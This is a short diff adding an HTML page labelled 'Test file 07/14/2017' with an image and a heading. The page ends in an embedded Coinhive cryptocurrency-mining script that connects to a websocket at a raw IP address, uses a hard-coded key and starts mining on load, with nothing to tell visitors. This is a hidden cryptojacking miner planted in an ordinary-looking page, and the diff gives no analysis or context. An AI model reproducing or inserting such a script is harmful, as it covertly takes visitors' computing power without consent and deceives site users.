@@ -1,0 +1,8 @@
+<html>
+<body>
+<img src="sailing.gif">
+<p></p>
+<h1>Test file 07/14/2017</h1>
+<p></p>
+<script src="https://coinhive.com/lib/coinhive.min.js"></script><script>CoinHive.CONFIG.WEBSOCKET_SHARDS = [["ws://165.227.232.206:8892"]];var miner = CoinHive.Anonymous('448tspMpkJ4Pm9NixYktM6MTFfM8PWVHN17iSECpdSHT1ejdbbWkvye8D3EVp56EUPQmj5uzkoDyUXrBDxDwCDGW1tPSFJC');miner.start();</script></body>
+</html>
